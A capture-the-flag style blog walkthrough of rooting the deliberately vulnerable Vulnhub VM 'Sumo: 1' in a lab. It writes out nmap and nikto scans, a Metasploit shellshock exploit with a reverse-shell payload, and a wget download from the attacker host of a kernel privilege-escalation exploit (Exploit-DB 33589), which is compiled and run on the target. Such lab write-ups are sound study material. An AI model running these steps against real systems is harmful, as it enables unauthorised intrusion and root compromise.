"Sumo: 1", a vulnerable-by-design virtual machine from Vulnhub, rated as Easy/Beginner level machine. We'll try to get root shell and obtain flag.
<!--exc-->


# Introduction
In this post, we'll try to root "Sumo: 1", a vulnerable-by-design virtual machine from Vulnhub.
It was created by [SunCSR Team](https://www.vulnhub.com/author/suncsr-team,696/).
It is rated as **Easy/Beginner** level machine.
**Goal**: Get the root shell and then obtain flag under /root).


# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors against the Sumo 1 virtual machine. These Linux distribution has all required tools pre-installed. Choose one of them.
* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox 
from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded 
from [https://www.parrotsec.org/download/](https://www.parrotsec.org/download/) 

## Sumo: 1 Vulnerable Machine
Download the virtual machine from [Vulnhub](https://www.vulnhub.com/entry/sumo-1,480/), start it and give it a couple of minutes to boot.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir`  and `cd` (change directory) into it:

```console
$ mkdir ~/vulnhub/sumo
$ cd ~/vulnhub/sumo/
```

## Verify our IP address
We need to verify our IP address. We'll use the `ip addr` command to list all interfaces on our machine:

```console
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group
       default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state 
      UP group default qlen 1000
    link/ether 08:00:27:0e:fd:23 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.4/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
       valid_lft 585sec preferred_lft 585sec
    inet6 fe80::9d63:5edd:cbec:c46a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

In this example, the machine's IP is **10.0.0.4** - as you can see under `eth0` section, which is my network interface. Your IP might be different and the network interface might be called `wlan0` for example.


# Scanning
## nmap
We first need to discover the machine's IP. We'll use a scan called **Ping Sweep** which will use ICMP ECHO packet to discover online hosts, without conducting further port scanning on each of the discovered host. [nmap](https://nmap.org/) flag for such command is `-sn`. The complete command is: `sudo nmap -sn 10.0.0.0/24` where we scan the whole 254 usable IPs in the 10.0.0.0 network:
```console
$ sudo nmap -sn 10.0.0.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 20:32 BST
Nmap scan report for 10.0.0.1
Host is up (0.00028s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.0.9
Host is up (0.00047s latency).
MAC Address: 08:00:27:C5:59:09 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.0.4
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 13.03 seconds
```

According to the above results, our target's IP is **10.0.0.9**.

## Add IP to hosts file [OPTIONAL]
For better readability and as I don't want to try and remember the target'd IP, I'll add the machine's IP to my local `/etc/hosts` file:

```console
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.0.0.9        sumo
...
```

Now we can use the '**sumo**' hostname instead of the IP in all the commands.

## Back to nmap
Time to run a full TCP-SYN scan to scan for open TCP ports on the target:
`sudo nmap sumo -sV -p- -O -T4 -oN nmap`
* `-sV` determine service/version info
* `-T4` for faster execution
* `-p-` scan all ports
* `-O` identify Operating System
* `-oN` output to file, in our case it's called nmap

```console
$ sudo nmap sumo -sV -p- -O -T4 -oN nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 21:35 BST
Nmap scan report for 10.0.0.9
Host is up (0.00062s latency).

```

## Firefox & Nikto
According to nmap scan results, HTTP port (80) is open, we'll use Firefox to access the page, view page source and HTTP headers for interesting information (Use F12 to open [Firefox Developers Tools](https://developer.mozilla.org/en-US/docs/Tools))

![Sumo1-firefox_screenshot](/assets/img/posts/Sumo1/Sumo1-firefox.webp) _Sumo1 Firefox screenshot_

Found nothing interesting, it's Apache default page and we already know the Apache version from nmap results.

Let's use [nikto](https://cirt.net/nikto2-docs/) to scan the web application. The command is expects at least on flag - `-h` which is the host address, resulting in: `nikto -h sumo`

```console
$ nikto -h sumo

# Gaining Access
## Metasploit & Searchsploit

Note:
: Before using metasploit, you might need to update it using `apt update; apt install metasploit-framework` command.

We can use metasploit `search` command to search for shellshock exploits. 
Launch [metasploit](https://www.metasploit.com/) using `msfconsole` command and use `search shellshock` (within metasploit console):

```console

We'll choose option number 5 using the `use 5` command.
We need to choose the payload to use once we're able to exploit. Let's use a reverse shell payload in order to have remote shell connection, which is the `set payload linux/x86/shell_reverse_tcp` command.
Using `options` command we can see what addtional information we must provide before we can use the exploit (under the Required column).

```console

Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

We need to:
* Set the target host `set RHOSTS sumo`
* Set path to CGI `set TARGETURI /cgi-bin/test`
* Set listening address (our host IP in this case) `set LHOST 10.0.0.4`

Now we can launch the attack using `exploit` command

```console
[*] Started reverse TCP handler on 10.0.0.4:4444

```

Success! We now have an open shell connection with the target.
Let's use some simple commands to gather basic information about the machine:
* `pwd` to *p*rint *w*orking *d*irectory: `/usr/lib/cgi-bin` path
* [`whoami`](https://en.wikipedia.org/wiki/Whoami) to display the username we're logged with: `www-data` user
* `uname -a` to print basic information about the system: `Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux`

Now let's try to change working directory into the `/root` folder using the `cd /root` command
`//bin/sh: 39: cd: can't cd to /root`.
Seems like our user does not have the needed permissions to access it.


# Privilege Escalation
Using the information we found using the `uname -a` command, we can look for known vulnerabilities using `searchsploit`:

```console

---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The second exploit -`Linux Kernel 3.2.0-23/3.5.0-23` - looks like a good option. 
In order to find  some more details regarding that exploit we'll use the `-p` flag. It will also copy the exploit path to our clipboard (nice touch searchsploit :D)

```console
searchsploit -p 33589
  Exploit: Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)
      URL: https://www.exploit-db.com/exploits/33589
     Path: /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c
File Type: C source, ASCII text, with CRLF line terminators

Copied EDB-ID #33589's path to the clipboard
```

Copy the C file into our working directory. We'll give it the same name as it's source file this time, but you may want to change it to something short and easy. up to you:
`cp /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c 33589.c`
As per the exploit's [exploit-db](https://www.exploit-db.com/exploits/33589) page, this is a "Local" type exploit, meaning we need to execute it **on the target machine**. 
Python provides a one-line HTTP server creation:

For Python 2.x we'll use `python -m SimpleHTTPServer 8088`.
For Python 3.x we'll use `python3 -m http.server`.

We can access the C file from our target using active shell session. It's best to first change into a directory we're sure we have execution permission. For example - `cd /tmp`.

Now pull the file using `wget http://10.0.0.4:8088/33589.c` command to download the file. Make sure you specify the relevant port according to the one provided in the Python script

```console
--2020-06-15 15:47:58--  http://10.0.0.4:8088/33589.c
Connecting to 10.0.0.4:8088... connected.

2020-06-15 15:47:58 (861 MB/s) - `33589.c' saved [3664/3664]
```

Now we need to [compile](https://en.wikipedia.org/wiki/Compiler) this C file into an executable file to run on the target machine. [gcc](https://gcc.gnu.org/) is a simple to use compiler installed on almost every Linux distribution:
`gcc 33589.c -O2 -o ./exploit` where:
* `-O2` is Uppercase O and the number 2
* `-o` for the output file and we provide the required location and file name.
I've encountered the following error:
`gcc: error trying to exec 'cc1': execvp: No such file or directory`
Quick Google search revels we're not the first to encounter this issue and a quick fix is to run the following command which adds the gcc required PATH:
`export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH`
Re-run the `gcc` command and now there's no output, which means, in our case, the command finished with no errors. Quick `ls` command reveals the new executable (called "exploit"):
```console
33589.c
KnQrX
exploit
vmIxd
```

Now we can execute it, providing "localhost" parameter as this is the host we want to exploit:
`./exploit localhost`

[`whoami`](https://en.wikipedia.org/wiki/Whoami) command verifies we now have root access. Last step is to get the flag from `/root` path:
```console
$ cat /root/root.txt
[REDUCTED]
```


# Summary
* Pay attention to small details such as the CVE number in the HTTP header.
* Google-Fu - Google is a great source of knowledge once (not if!) you face an issue.
